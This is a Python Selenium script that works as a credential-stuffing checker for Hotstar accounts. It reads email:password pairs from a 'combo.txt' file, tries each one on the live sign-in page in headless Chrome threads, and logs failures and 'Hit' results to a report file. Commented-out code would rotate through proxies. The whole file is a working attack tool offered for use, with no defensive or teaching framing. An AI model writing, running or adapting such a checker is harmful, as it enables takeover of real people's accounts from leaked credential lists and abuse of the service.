from selenium import webdriver
from selenium.webdriver.chrome.options import Options 
from selenium.webdriver.chrome.service import Service
import threading
import sys
import time

with open("report.txt","w") as file:
	file.write("Email"+"	"+"Password"+"		"+"Result" + "\n")
def report_wt(_result):
	with open("report.txt","a") as file:
		file.write(str(_result)+"\n")
	

def login(_email,_passwd):
	#PROXY = _proxy
	
	chrome_options = Options()  
	chrome_options.add_argument("--headless")
	#chrome_options.add_argument('--proxy-server=%s' % PROXY)

	service = Service('/usr/bin/chromedriver')
	driver = webdriver.Chrome(service=service,options=chrome_options)
	driver.implicitly_wait(10)


	driver.get("https://www.hotstar.com/in/subscribe/sign-in?returnURL=https%3A%2F%2Fgoogle.com")
	while True:
		try:
			driver.find_element_by_xpath('/html/body/div/div[2]/div/div[1]/div[2]/div/div/div/div/div/button').click()
	
	
			email = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[1]/div[2]/div/div/div/div/div/div[3]/div[1]/input')
	
	
			email.send_keys(str(_email))
			break
		except:
			continue


	while True:
		try:
			driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[1]/div[2]/div/div/div/div/div/div[3]/button').click()
			break
		except:
			continue
	
	while True:
		try:
			passwd  = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[1]/div[2]/div/div/div/div/div/div[3]/div[2]/input')
			
			passwd.send_keys(str(_passwd))
			time.sleep(1)
			subbtn = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[1]/div[2]/div/div/div/div/div/div[3]/button')
			
			subbtn.click()
			break
		except:
			try:
				err = driver.find_element_by_xpath("/html/body/div[1]/div[2]/div/div[1]/div[2]/div/div/div/div/div/div[1]/span[2]").text
				#print(str(str(_email)+":"+str(_passwd)+"	"+str(err)))
				report_wt(str(str(_email)+":"+str(_passwd)+"	"+str(err)))
				break
			except:
				continue
	time.sleep(3)


	#driver.get("https://www.hotstar.com/in/subscribe/my-account")
	time.sleep(0)
	while True:
		try:
			err = driver.find_element_by_xpath("/html/body/div[1]/div[2]/div/div[1]/div[2]/div/div/div/div/div/div[3]/p").text
			#print(str(_email)+":"+str(_passwd)+"	"+str(name))
			report_wt(str(str(_email)+":"+str(_passwd)+"	"+str(err)))
			break
		except:
			try:
				#err = driver.find_element_by_xpath("/html/body/div[1]/div[2]/div/div[1]/div[2]/div/div/div/div/div/div[3]/p").text
				report_wt(str(str(_email)+":"+str(_passwd)+"	"+str(Hit)))				
				#print(str(_email)+":"+str(_passwd)+"	"+str(err))			
				break			
			except:
				continue			



	

	driver.quit()
	
"""proxies = []
def proxy_loader():
	with open("proxy.txt","r") as file:
		for line in file:
			proxies.append(line.strip())

proxy_loader()"""

index = 0
main_index = 0
with open("combo.txt","r") as file:
	for pair in file:
		pair = pair.strip()
		thread = threading.Thread(target = login , args = (pair.split(':')[0],pair.split(':')[1]))
		thread.start()
		time.sleep(2)
		print("[+]"+str(index) ,end="\r")
		index += 1
		main_index+=1
		if index == 6:
			print("[+] Checking the loaded accounts")
			time.sleep(20)
			index = 0
			

sys.exit()
		 
		




